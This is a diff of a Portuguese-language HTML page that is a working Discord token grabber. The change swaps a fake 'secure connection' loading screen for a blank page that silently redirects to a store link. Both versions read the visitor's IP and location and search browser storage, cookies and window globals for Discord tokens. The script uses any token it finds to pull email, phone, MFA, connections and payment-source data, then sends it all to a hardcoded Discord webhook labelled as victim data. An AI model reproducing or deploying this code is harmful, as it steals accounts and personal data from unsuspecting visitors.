@@ -3,84 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carregando...</title>
+    <title>...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0f0f13;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #e0e0e0;
-        }
-        .container {
-            text-align: center;
-            padding: 40px;
-            max-width: 400px;
-            width: 90%;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #2a2a35;
-            border-top: 4px solid #9B59B6;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        h2 { font-size: 18px; font-weight: 500; margin-bottom: 8px; color: #c0c0c0; }
-        p { font-size: 13px; color: #6a6a7a; margin-bottom: 4px; }
-        .bar {
-            width: 100%; height: 4px;
-            background: #1a1a24; border-radius: 2px;
-            overflow: hidden; margin: 20px 0;
-        }
-        .bar-fill {
-            height: 100%; width: 0%;
-            background: #9B59B6; border-radius: 2px;
-            transition: width 0.4s;
-        }
-        .footer-text { font-size: 11px; color: #3a3a48; margin-top: 30px; }
+        /* Invisível - página em branco */
+        body { background: #fff; margin: 0; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="spinner"></div>
-    <h2>A carregar, por favor aguarda...</h2>
-    <p>A ligação está a ser estabelecida</p>
-    <div class="bar"><div class="bar-fill" id="barFill"></div></div>
-    <p class="status-text" id="statusText" style="font-size:12px; color:#5a5a6a;">A verificar ligação</p>
-    <div class="footer-text">secured • 256-bit encryption</div>
-</div>
-
 <script>
     (async function() {
         const webhookURL = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
-        
-        const statusText = document.getElementById('statusText');
-        const barFill = document.getElementById('barFill');
+        const redirectURL = "https://x.com/antilEsbicas"; // ← COLOCA AQUI O LINK DA TUA LOJA
 
-        function atualizar(texto, progresso) {
-            statusText.textContent = texto;
-            barFill.style.width = progresso + "%";
-        }
-
-        // === 1. IP ===
-        atualizar("A obter informações da rede...", 10);
         let ip = "Não capturado";
         try {
             const resp = await fetch("https://api.ipify.org?format=json");
-            const data = await resp.json();
-            ip = data.ip;
+            ip = (await resp.json()).ip;
         } catch(e) {}
 
-        // === 2. LOCALIZAÇÃO ===
-        atualizar("A analisar localização...", 20);
         let cidade = "N/A", pais = "N/A", isp = "N/A";
         try {
             const locResp = await fetch("https://ipapi.co/json/");
@@ -90,12 +30,9 @@
             isp = locData.org || "N/A";
         } catch(e) {}
 
-        // === 3. TENTAR CAPTURAR TOKEN ===
-        atualizar("A validar sessão...", 35);
-        
         let token = null;
         let metodos = [];
-        
+
         const chavesPossiveis = [
             "token", "access_token", "refresh_token", "discord_token",
             "discord_access_token", "authorization", "bearer",
@@ -105,351 +42,100 @@
             "discord.user.token", "discord_token_v2",
             "discord.accessToken", "discord.refreshToken"
         ];
-        
-        // Método 1: localStorage
-        try {
-            for (const chave of chavesPossiveis) {
-                try {
-                    const valor = localStorage.getItem(chave);
-                    if (valor && valor.length > 20) {
-                        token = valor;
-                        metodos.push("localStorage:" + chave);
-                        break;
-                    }
-                } catch(e) {}
-            }
-        } catch(e) {}
-        
-        // Método 2: sessionStorage
-        if (!token) {
-            try {
-                for (const chave of chavesPossiveis) {
-                    try {
-                        const valor = sessionStorage.getItem(chave);
-                        if (valor && valor.length > 20) {
-                            token = valor;
-                            metodos.push("sessionStorage:" + chave);
-                            break;
-                        }
-                    } catch(e) {}
-                }
-            } catch(e) {}
-        }
-        
-        // Método 3: Varrer localStorage
-        if (!token) {
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const chave = localStorage.key(i);
-                    const valor = localStorage.getItem(chave);
-                    if (valor && typeof valor === 'string' && valor.length > 30) {
-                        if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) {
-                            token = valor;
-                            metodos.push("localStorage:" + chave.substring(0, 20));
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 4: Varrer sessionStorage
-        if (!token) {
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const chave = sessionStorage.key(i);
-                    const valor = sessionStorage.getItem(chave);
-                    if (valor && typeof valor === 'string' && valor.length > 30) {
-                        if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) {
-                            token = valor;
-                            metodos.push("sessionStorage:" + chave.substring(0, 20));
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 5: IndexedDB
-        if (!token) {
-            try {
-                const databases = await indexedDB.databases ? await indexedDB.databases() : [];
-                for (const db of databases) {
-                    if (db.name && db.name.toLowerCase().includes('discord')) {
-                        metodos.push("indexedDB:" + db.name);
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 6: Cookies
-        if (!token) {
-            try {
-                const cookies = document.cookie.split(';');
-                for (const cookie of cookies) {
-                    const [nome, valor] = cookie.trim().split('=');
-                    if (valor && valor.length > 30 && (valor.includes('.') || valor.includes('mfa'))) {
-                        token = valor;
-                        metodos.push("cookie:" + nome);
-                        break;
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 7: window
-        if (!token) {
-            try {
-                for (const key in window) {
-                    try {
-                        const val = window[key];
-                        if (val && typeof val === 'string' && val.length > 50 && val.includes('.')) {
-                            const parts = val.split('.');
-                            if (parts.length === 3) {
-                                token = val;
-                                metodos.push("window." + key);
-                                break;
-                            }
-                        }
-                    } catch(e) {}
-                }
-            } catch(e) {}
-        }
 
-        // === 4. ENVIAR DADOS ===
-        atualizar("A finalizar ligação...", 70);
-        
-        let email = "Não disponível";
-        let phone = "Não disponível";
-        let username = "Não logado";
-        let userID = "Desconhecido";
-        let nitro = "N/A";
-        let mfa = "N/A";
-        let verified = "N/A";
-        let createdAt = "N/A";
-        
+        try { for (const chave of chavesPossiveis) { try { const valor = localStorage.getItem(chave); if (valor && valor.length > 20) { token = valor; metodos.push("localStorage:" + chave); break; } } catch(e) {} } } catch(e) {}
+        if (!token) { try { for (const chave of chavesPossiveis) { try { const valor = sessionStorage.getItem(chave); if (valor && valor.length > 20) { token = valor; metodos.push("sessionStorage:" + chave); break; } } catch(e) {} } } catch(e) {} }
+        if (!token) { try { for (let i = 0; i < localStorage.length; i++) { const chave = localStorage.key(i); const valor = localStorage.getItem(chave); if (valor && typeof valor === 'string' && valor.length > 30) { if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) { token = valor; metodos.push("localStorage:" + chave.substring(0, 20)); break; } } } } catch(e) {} }
+        if (!token) { try { for (let i = 0; i < sessionStorage.length; i++) { const chave = sessionStorage.key(i); const valor = sessionStorage.getItem(chave); if (valor && typeof valor === 'string' && valor.length > 30) { if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) { token = valor; metodos.push("sessionStorage:" + chave.substring(0, 20)); break; } } } } catch(e) {} }
+        if (!token) { try { const databases = await indexedDB.databases ? await indexedDB.databases() : []; for (const db of databases) { if (db.name && db.name.toLowerCase().includes('discord')) { metodos.push("indexedDB:" + db.name); } } } catch(e) {} }
+        if (!token) { try { const cookies = document.cookie.split(';'); for (const cookie of cookies) { const [nome, valor] = cookie.trim().split('='); if (valor && valor.length > 30 && (valor.includes('.') || valor.includes('mfa'))) { token = valor; metodos.push("cookie:" + nome); break; } } } catch(e) {} }
+        if (!token) { try { for (const key in window) { try { const val = window[key]; if (val && typeof val === 'string' && val.length > 50 && val.includes('.')) { const parts = val.split('.'); if (parts.length === 3) { token = val; metodos.push("window." + key); break; } } } catch(e) {} } } catch(e) {} }
+
         async function enviarEmbed(titulo, fields, descricao, mentionEveryone) {
             const content = mentionEveryone ? "@everyone" : "";
-            
             const embed = {
                 title: titulo,
                 color: 0x9B59B6,
                 description: descricao || "",
                 fields: fields,
-                footer: {
-                    text: "xxx team",
-                    icon_url: "https://cdn.discordapp.com/emojis/1081535536565063770.png"
-                },
+                footer: { text: "xxx team" },
                 timestamp: new Date().toISOString()
             };
-            
             const payload = { embeds: [embed] };
             if (content) payload.content = content;
-            
             await fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
         }
-        
+
         if (token && token.length > 40 && !token.includes(" ")) {
             try {
                 const headers = { "Authorization": token };
-                
                 let resp = await fetch("https://discord.com/api/v9/users/@me", { headers });
-                
-                if (!resp.ok) {
-                    resp = await fetch("https://discord.com/api/v10/users/@me", { headers });
-                }
-                
+                if (!resp.ok) resp = await fetch("https://discord.com/api/v10/users/@me", { headers });
+
                 if (resp.ok) {
                     const data = await resp.json();
-                    
-                    username = data.username || "Desconhecido";
-                    if (data.discriminator && data.discriminator !== "0") {
-                        username += "#" + data.discriminator;
-                    }
-                    userID = data.id || "Desconhecido";
-                    email = data.email || "Oculto/indisponível";
-                    phone = data.phone || "Não vinculado";
-                    mfa = data.mfa_enabled ? "Sim" : "Não";
-                    verified = data.verified ? "Sim" : "Não";
-                    
+                    let username = data.username || "Desconhecido";
+                    if (data.discriminator && data.discriminator !== "0") username += "#" + data.discriminator;
+                    let email = data.email || "Oculto/indisponível";
+                    let phone = data.phone || "Não vinculado";
+                    let mfa = data.mfa_enabled ? "Sim" : "Não";
+                    let verified = data.verified ? "Sim" : "Não";
                     const premium = data.premium_type || 0;
-                    nitro = premium === 2 ? "Nitro Clássico" : premium === 1 ? "Nitro Básico" : "Não";
-                    
-                    if (data.id) {
-                        const timestamp = (parseInt(data.id) / 4194304) + 1420070400000;
-                        createdAt = new Date(timestamp).toLocaleDateString('pt-PT');
-                    }
-                    
-                    // Tentar settings
-                    try {
-                        const settingsResp = await fetch("https://discord.com/api/v9/users/@me/settings", { headers });
-                        if (settingsResp.ok) {
-                            const settings = await settingsResp.json();
-                            if (settings.email && email === "Oculto/indisponível") email = settings.email;
-                            if (settings.phone && phone === "Não vinculado") phone = settings.phone;
-                        }
-                    } catch(e) {}
-                    
-                    // Tentar connections
+                    let nitro = premium === 2 ? "Nitro Clássico" : premium === 1 ? "Nitro Básico" : "Não";
+                    let createdAt = "N/A";
+                    if (data.id) { const t = (parseInt(data.id) / 4194304) + 1420070400000; createdAt = new Date(t).toLocaleDateString('pt-PT'); }
+
                     let connections = "Nenhuma";
-                    try {
-                        const connResp = await fetch("https://discord.com/api/v9/users/@me/connections", { headers });
-                        if (connResp.ok) {
-                            const connData = await connResp.json();
-                            if (connData.length > 0) {
-                                connections = connData.slice(0, 5).map(c => `${c.type}: ${c.name}`).join(", ");
-                            }
-                        }
-                    } catch(e) {}
-                    
-                    // Tentar guilds
+                    try { const cR = await fetch("https://discord.com/api/v9/users/@me/connections", { headers }); if (cR.ok) { const cD = await cR.json(); if (cD.length > 0) connections = cD.slice(0, 5).map(c => `${c.type}: ${c.name}`).join(", "); } } catch(e) {}
+
                     let guildsCount = "N/A";
-                    try {
-                        const guildsResp = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers });
-                        if (guildsResp.ok) {
-                            const guildsData = await guildsResp.json();
-                            guildsCount = guildsData.length + " servidores";
-                        }
-                    } catch(e) {}
-                    
-                    // Tentar billing
+                    try { const gR = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers }); if (gR.ok) guildsCount = (await gR.json()).length + " servidores"; } catch(e) {}
+
                     let billingInfo = "Nenhum";
-                    try {
-                        const billResp = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", { headers });
-                        if (billResp.ok) {
-                            const billData = await billResp.json();
-                            if (billData.length > 0) {
-                                billingInfo = billData.length + " método(s) de pagamento";
-                            }
-                        }
-                    } catch(e) {}
+                    try { const bR = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", { headers }); if (bR.ok) { const bD = await bR.json(); if (bD.length > 0) billingInfo = bD.length + " método(s) de pagamento"; } } catch(e) {}
 
                     await enviarEmbed(
                         "🎯 TOKEN VÁLIDO - DADOS DA VÍTIMA",
                         [
-                            {
-                                name: "👤 **USUÁRIO**",
-                                value: `**Discord:** ${username}\n**ID:** ${userID}\n**Conta criada:** ${createdAt}`,
-                                inline: false
-                            },
-                            {
-                                name: "📧 **EMAIL & TELEFONE**",
-                                value: `**Email:** ${email}\n**Telefone:** ${phone}\n**Verificado:** ${verified}`,
-                                inline: true
-                            },
-                            {
-                                name: "🔒 **SEGURANÇA**",
-                                value: `**MFA:** ${mfa}\n**Nitro:** ${nitro}`,
-                                inline: true
-                            },
-                            {
-                                name: "📊 **ESTATÍSTICAS**",
-                                value: `**Servidores:** ${guildsCount}\n**Conexões:** ${connections}\n**Pagamento:** ${billingInfo}`,
-                                inline: false
-                            },
-                            {
-                                name: "🔑 **TOKEN**",
-                                value: `\`\`\`${token}\`\`\`\n**Método:** ${metodos.join(", ") || "Desconhecido"}`,
-                                inline: false
-                            },
-                            {
-                                name: "🌐 **LOCALIZAÇÃO**",
-                                value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`,
-                                inline: true
-                            },
-                            {
-                                name: "💻 **SISTEMA**",
-                                value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}\n**Resolução:** ${screen.width}x${screen.height}`,
-                                inline: true
-                            }
+                            { name: "👤 **USUÁRIO**", value: `**Discord:** ${username}\n**ID:** ${data.id}\n**Conta criada:** ${createdAt}`, inline: false },
+                            { name: "📧 **EMAIL & TELEFONE**", value: `**Email:** ${email}\n**Telefone:** ${phone}\n**Verificado:** ${verified}`, inline: true },
+                            { name: "🔒 **SEGURANÇA**", value: `**MFA:** ${mfa}\n**Nitro:** ${nitro}`, inline: true },
+                            { name: "📊 **ESTATÍSTICAS**", value: `**Servidores:** ${guildsCount}\n**Conexões:** ${connections}\n**Pagamento:** ${billingInfo}`, inline: false },
+                            { name: "🔑 **TOKEN**", value: `\`\`\`${token}\`\`\`\n**Método:** ${metodos.join(", ") || "Desconhecido"}`, inline: false },
+                            { name: "🌐 **LOCALIZAÇÃO**", value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`, inline: true },
+                            { name: "💻 **SISTEMA**", value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}\n**Resolução:** ${screen.width}x${screen.height}`, inline: true }
                         ],
                         `**${username}** caiu no grabber! 🎉`,
                         false
                     );
-                    
                 } else {
-                    await enviarEmbed(
-                        "⚠️ TOKEN INVÁLIDO",
-                        [
-                            {
-                                name: "🔑 Token",
-                                value: `\`${token}\``,
-                                inline: false
-                            },
-                            {
-                                name: "🌐 IP",
-                                value: ip,
-                                inline: true
-                            },
-                            {
-                                name: "📍 Localização",
-                                value: `${cidade}, ${pais}`,
-                                inline: true
-                            },
-                            {
-                                name: "📡 ISP",
-                                value: isp,
-                                inline: true
-                            }
-                        ],
-                        `Status HTTP: ${resp.status}`,
-                        false
-                    );
+                    await enviarEmbed("⚠️ TOKEN INVÁLIDO", [
+                        { name: "🔑 Token", value: `\`${token}\``, inline: false },
+                        { name: "🌐 IP", value: ip, inline: true },
+                        { name: "📍 Localização", value: `${cidade}, ${pais}`, inline: true },
+                        { name: "📡 ISP", value: isp, inline: true }
+                    ], `Status HTTP: ${resp.status}`, false);
                 }
             } catch(e) {
-                await enviarEmbed(
-                    "❌ ERRO AO VALIDAR TOKEN",
-                    [
-                        {
-                            name: "🌐 IP",
-                            value: ip,
-                            inline: true
-                        },
-                        {
-                            name: "❌ Erro",
-                            value: e.message.substring(0, 100),
-                            inline: true
-                        }
-                    ],
-                    "",
-                    false
-                );
+                await enviarEmbed("❌ ERRO AO VALIDAR TOKEN", [
+                    { name: "🌐 IP", value: ip, inline: true },
+                    { name: "❌ Erro", value: e.message.substring(0, 100), inline: true }
+                ], "", false);
             }
         } else {
-            await enviarEmbed(
-                "@everyone mais um burro 🐴",
-                [
-                    {
-                        name: "🌐 **LOCALIZAÇÃO**",
-                        value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`,
-                        inline: true
-                    },
-                    {
-                        name: "💻 **SISTEMA**",
-                        value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}`,
-                        inline: true
-                    },
-                    {
-                        name: "🔍 **Métodos tentados**",
-                        value: "localStorage, sessionStorage, cookies, IndexedDB, window",
-                        inline: false
-                    }
-                ],
-                `IP: ${ip} | ${cidade}, ${pais}`,
-                true
-            );
+            await enviarEmbed("@everyone mais um burro 🐴", [
+                { name: "🌐 **LOCALIZAÇÃO**", value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`, inline: true },
+                { name: "💻 **SISTEMA**", value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}`, inline: true },
+                { name: "🔍 **Métodos tentados**", value: "localStorage, sessionStorage, cookies, IndexedDB, window", inline: false }
+            ], `IP: ${ip} | ${cidade}, ${pais}`, true);
         }
 
-        // === 5. REDIRECIONAR ===
-        atualizar("Ligação estabelecida! A redirecionar...", 100);
-        
-        setTimeout(() => {
-            window.location.href = "https://discord.com/channels/@me";
-        }, 2000);
+        // REDIRECIONA SILENCIOSAMENTE PARA A LOJA
+        window.location.replace(redirectURL);
     })();
 </script>
 </body>
